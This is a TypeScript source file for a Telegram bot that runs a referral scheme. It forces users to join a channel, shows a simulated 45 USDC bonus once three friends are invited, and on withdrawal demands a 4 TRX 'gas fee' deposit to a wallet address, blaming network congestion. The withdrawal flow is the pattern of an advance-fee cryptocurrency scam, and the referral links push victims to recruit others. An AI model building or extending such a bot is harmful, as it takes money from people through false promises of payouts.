import { Bot, Context } from "grammy";
import { autoRetry } from "@grammyjs/auto-retry";
import { forceJoinMiddleware } from "./middlewares/forceJoin";

export interface BotContext extends Context {
  env: any; // Cloudflare Bindings
}

export function createBot(token: string, env: any) {
  const bot = new Bot<BotContext>(token);
  bot.api.config.use(autoRetry());

  // Apply Force Join Middleware to all commands except callback query triggers for checking membership
  bot.use((ctx, next) => {
    if (ctx.callbackQuery?.data === "check_membership") {
      return next();
    }
    return forceJoinMiddleware(ctx, next);
  });

  // Action for checking membership manually
  bot.callbackQuery("check_membership", async (ctx) => {
    const CHANNEL_ID = "@your_channel_username";
    const userId = ctx.from.id;

    try {
      const member = await ctx.api.getChatMember(CHANNEL_ID, userId);
      const isMember = ["member", "administrator", "creator"].includes(member.status);

      if (isMember) {
        await ctx.answerCallbackQuery("✅ Membership verified! Welcome.");
        await ctx.editMessageText("🎉 Thank you for joining! You can now use the bot. Type /start to open the dashboard.");
      } else {
        await ctx.answerCallbackQuery({
          text: "❌ You still haven't joined the channel!",
          show_alert: true
        });
      }
    } catch (e) {
      await ctx.answerCallbackQuery("Error verifying status. Try again.");
    }
  });

  // Main Dashboard Command
  bot.command("start", async (ctx) => {
    const userId = ctx.from?.id;
    
    // Simulated DB Fetch for UX presentation
    // In production, fetch these values from Cloudflare D1
    const inviteCount = 2; // e.g., user has invited 2 people so far
    const balance = inviteCount >= 3 ? 45.00 : 0.00;
    const neededInvites = Math.max(0, 3 - inviteCount);

    let statusMessage = `📊 **Referral Lite Dashboard**\n\n`;
    statusMessage += `💰 **Accumulated Balance:** \`${balance.toFixed(4)} USDC\`\n`;
    
    if (inviteCount < 3) {
      statusMessage += `🎯 **Progress:** \`${inviteCount}/3\` Friends Invited\n`;
      statusMessage += `⚡ Invite *${neededInvites}* more friends to unlock your **45 USDC Bonus**!\n`;
    } else {
      statusMessage += `✅ **Milestone Unlocked!** Ready for withdrawal.\n`;
    }

    const botUsername = ctx.me.username;
    const referralLink = `https://t.me/${botUsername}?start=ref_${userId}`;

    await ctx.reply(statusMessage, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔗 Invite Friends (Get Link)", callback_data: "get_link" }],
          [
            { text: "👥 My Referrals", callback_data: "view_ref" },
            { text: "📜 Program Rules", callback_data: "view_rules" }
          ],
          [{ text: "💸 Withdraw Balance", callback_data: "trigger_withdraw" }]
        ]
      }
    });
  });

  // Handle Withdrawal Logic & Gas Fee Notification
  bot.callbackQuery("trigger_withdraw", async (ctx) => {
    // In production, perform D1 query to verify inviteCount >= 3
    const inviteCount = 2; 
    
    if (inviteCount < 3) {
      await ctx.answerCallbackQuery({
        text: "❌ Minimum milestone not reached! You need 3 valid referrals.",
        show_alert: true
      });
      return;
    }

    // If milestone reached but gas fee is needed:
    let withdrawText = `💸 **Secure Smart Contract Withdrawal**\n\n`;
    withdrawText += `Amount Secured: \`45.0000 USDC\`\n`;
    withdrawText += `⚠️ **Network Gas Fee Required:** \`4.0000 TRX\`\n\n`;
    withdrawText += `Due to blockchain network congestion, a minimal gas fee of 4 TRX is required to process the instant USDC batch payment to your wallet.\n\n`;
    withdrawText += `Deposit Address (TRC-20):\n\`TYccE6g6...YOUR_TRX_WALLET_ADDRESS...\``;

    await ctx.editMessageText(withdrawText, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ I Have Deposited (Verify)", callback_data: "verify_trx_payment" }],
          [{ text: "🔙 Back to Dashboard", callback_data: "back_to_main" }]
        ]
      }
    });
  });

  // Handle Invitation Link Generation
  bot.callbackQuery("get_link", async (ctx) => {
    const userId = ctx.from.id;
    const link = `https://t.me/${ctx.me.username}?start=ref_${userId}`;
    
    await ctx.reply(`🎁 Share this link with your friends. Once they join the channel, your progress updates!\n\n\`${link}\``, {
      parse_mode: "Markdown"
    });
    await ctx.answerCallbackQuery();
  });

  return bot;
}
